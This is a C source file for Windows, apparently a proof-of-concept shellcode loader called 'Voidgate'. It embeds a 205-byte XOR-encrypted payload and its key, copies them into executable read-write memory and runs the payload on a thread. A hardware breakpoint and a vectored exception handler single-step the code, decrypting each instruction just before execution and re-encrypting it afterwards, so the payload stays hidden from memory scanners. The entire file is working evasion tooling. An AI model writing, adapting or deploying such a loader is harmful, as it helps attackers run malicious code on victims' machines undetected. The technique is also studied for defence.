#include "Windows.h"
#include "immintrin.h"
#include "stdio.h"

// Global data for payload
const unsigned char payloadXorEncrypted[] = "\xBC\xF3\x16\xEF\xD4\x51\x6E\x4E\x42\x4D\x49\xAE\xFC\xBC\xD3\x9F\x2C\xF0\xCC\x56\x30\x5D\x37\x7F\xB3\x7E\xC7\xAA\x21\xD2\x9A\xB5\x91\x4B\x5A\x18\xDB\x0C\xC8\x0F\x76\x6E\x3F\x85\x12\xEE\x6D\xFD\x38\x46\x73\x24\xC4\x3D\x7A\x7F\x8B\xFC\x97\xB0\x6F\xF0\xBD\xDF\x71\xFC\x95\xE0\xEF\xE6\x41\x54\x93\x65\xE6\xFD\x4D\x58\xA8\x44\x38\x30\x2C\x23\xB1\xDA\x6D\x67\x32\xC0\xE1\x1A\x37\xEC\xFA\xDB\x60\x7B\xEF\x86\x34\x72\x20\x84\x1C\x31\x76\x08\xAD\x5F\xF6\x3B\x0E\x6C\x54\x24\x37\xB0\x8D\x56\x6E\xE9\x4B\x8F\x8D\x69\x63\x5F\x4B\x88\x06\xC1\xFD\xF2\xFD\xCA\x0C\x1B\x6C\x19\x52\xB0\x55\x15\xBA\xFC\x03\x33\xD3\x5A\x64\xDD\x53\x97\xE9\x9B\xCB\xFB\x47\x3F\xBF\xFB\x82\x93\x7D\x0F\xAC\xA3\xAE\x66\x25\x5C\x52\xAF\x88\x12\xEE\x7E\x76\x4B\x6C\x95\x77\x05\xCE\xA2\x8E\xD0\x40\x0B\x87\xBC\x83\x14\x42\x52\x3A\x8F\x3E\xB5\x3B\xF2\xA3\xDE\x98";
const unsigned char xorDecryptionKey[] = "\xF4\xC2\xE9\xA7\x23\xB6\x0B\x06\xC9\x15\x29\xE6\x77\xE7\xCB\xD7\xA7\xAB\xEC\x1E\xBB\x46\x7F\xF4\xA8\x36\x4C\xF1\x01\x9B\x13\x6D\x1A\x10\x66\x54\xDA\xCF\x80\x3E\xBF\x08\xBE\x44\xED\x66\x25\x3C\xD1\x4E\xF8\x30\xCF\x71\x7B\xBD\xC6\xCD\x45\xF4\xE4\xA2\xA1\x92\x70\x3E\xD8\xD1\x34\xA2\xCA\x0E\xB3\x28\xE7\x3E\x00\x69\x4C\x00\xB3\x52\x08\x6E\xB0\x1E\x86\x55\x69\x99\xA9\x2B\xF7\xA4\x73\x39\x31\x33\x64\x8A\x10\x3A\x11\x7B\x5D\xBA\x4A\x8B\xE1\x5E\x31\x73\x87\xBA\xA7\x82\x43\xB5\xC5\xA9\xAE\x02\xAD\xD6\xEB\x28\xE8\x5B\x0F\xC9\x8D\xC5\x7F\xBE\xFC\x0A\x5F\xD8\x24\x28\x9B\x30\x94\x12\xF2\x44\x0C\x9B\x45\xCB\xDE\x5A\xC9\x0B\xA1\x6C\x1B\xB3\x86\xD7\xB7\xAB\xD3\x7B\xCD\xF0\x53\x5C\xE7\xEF\xE3\x14\x63\x66\xC0\xE5\x0F\x2E\x3E\xF3\xF0\x0B\xE4\x99\x1F\x38\x09\x4A\x08\xFC\x57\xEC\xCB\x9D\xA3\x1A\xC5\x4D\x76\x36\xD7\xD2\xE2\x21\x4E";
const unsigned int payloadAndKeyLen = 205;


// Global data for Voidgate functions
const unsigned int maxInstructionLen = 16;
PVOID payloadXorEncryptedExecutable = NULL;

/*
Creates a thread to execute payload in
*/
HANDLE CreateThreadForPayload(IN PVOID pEncryptedPayload, IN OPTIONAL PDWORD pThreadId) {
	// Initialise and create thread in suspended mode
	HANDLE hThread = CreateThread(NULL, 0, pEncryptedPayload, NULL, CREATE_SUSPENDED, pThreadId);
	if (hThread == NULL) return NULL;

	// Set hardware breakpoint at start of payload
	CONTEXT cThread = {.ContextFlags = CONTEXT_DEBUG_REGISTERS };
	if (!GetThreadContext(hThread, &cThread)) return NULL;
	cThread.Dr0 = pEncryptedPayload;

	// Configure hardware breakpoint by modifying existing Dr7
	const DWORD64 enableDr0 = (1 << 1) | (1 << 0); // 0th and 1st bits G0 and G1, must be enabled to enable Dr0
	const DWORD64 compatbility1 = (1 << 8) | (1 << 9); // LE & GE must be enabled for older hardware
	cThread.Dr7 |= enableDr0 | compatbility1;

	// Set the modified thread context
	if (!SetThreadContext(hThread, &cThread)) return NULL;

	// Resume execution
	ResumeThread(hThread);

	// Return
	return hThread;
}

/*
Handles the breakpoints for the payload; re-encrypts previous instruction and decrypts current instruction
*/
PVOID prevRip = NULL;
LONG HardwareBreakpointHandler(PEXCEPTION_POINTERS pExceptionPointers) {
	// If exception came from our single-stepping from inside our payload
	if (pExceptionPointers->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP
		&& (pExceptionPointers->ContextRecord->Rip >= (DWORD64)payloadXorEncryptedExecutable
		&& pExceptionPointers->ContextRecord->Rip < (DWORD64)payloadXorEncryptedExecutable + payloadAndKeyLen)
		&& (pExceptionPointers->ExceptionRecord->ExceptionAddress >= (DWORD64)payloadXorEncryptedExecutable
			&& pExceptionPointers->ExceptionRecord->ExceptionAddress < (DWORD64)payloadXorEncryptedExecutable + payloadAndKeyLen)
		) {
		PCONTEXT pcThread = pExceptionPointers->ContextRecord;

		printf("Inside HardwareBreakpointHandler; rip: %p, offset: %d\n", (PVOID)(pcThread->Rip), pcThread->Rip - (DWORD64)payloadXorEncryptedExecutable);

		// Re-encrypt previous instruction
		if (prevRip != NULL) {
			for (int i = 0; i < maxInstructionLen; i++) {
				((unsigned char*)prevRip)[i] ^= xorDecryptionKey[(DWORD64)prevRip - (DWORD64)payloadXorEncryptedExecutable + i];
			}
		}

		// Decrypt current instruction
		for (int i = 0; i < maxInstructionLen; i++) {
			((unsigned char*)(pcThread->Rip))[i] ^= xorDecryptionKey[pcThread->Rip - (DWORD64)payloadXorEncryptedExecutable + i];
		}
		prevRip = pcThread->Rip;

		// Set Resume Flag (RF) in EFlags so we are not stuck in loop
		pExceptionPointers->ContextRecord->EFlags |= 0x10000;

		// Enabling TF (Trap Flag) in EFlags so that breakpoint handler is triggered for every instruction (step-through)
		pExceptionPointers->ContextRecord->EFlags |= 0x0100;

		// Execute current instruction
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// If exception came from anywhere else, skip handling it
	else {
		printf("Unexpected exception from %p; exception code: %d\n", pExceptionPointers->ExceptionRecord->ExceptionAddress, pExceptionPointers->ExceptionRecord->ExceptionCode);
		return EXCEPTION_CONTINUE_SEARCH;
	}
}


void main() {
	// Attach hardware breakpoint handler
	HANDLE hVectoredExceptionHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)&HardwareBreakpointHandler);
	if (hVectoredExceptionHandler == NULL) return;

	// Copy encrypted payload into executable memory
	payloadXorEncryptedExecutable = VirtualAlloc(NULL, payloadAndKeyLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payloadXorEncryptedExecutable == NULL) return;
	RtlCopyMemory(payloadXorEncryptedExecutable, payloadXorEncrypted, payloadAndKeyLen);

	// Create and start thread for payload, and attach hardware breakpoint to start address
	HANDLE hThread = CreateThreadForPayload(payloadXorEncryptedExecutable, NULL);
	if (hThread == NULL) return;

	// Wait for thread and then close it
	WaitForSingleObject(hThread, INFINITE);

	// Cleanup
	RemoveVectoredExceptionHandler(hVectoredExceptionHandler);
	CloseHandle(hThread);
	VirtualFree(payloadXorEncryptedExecutable, 0, MEM_RELEASE);
}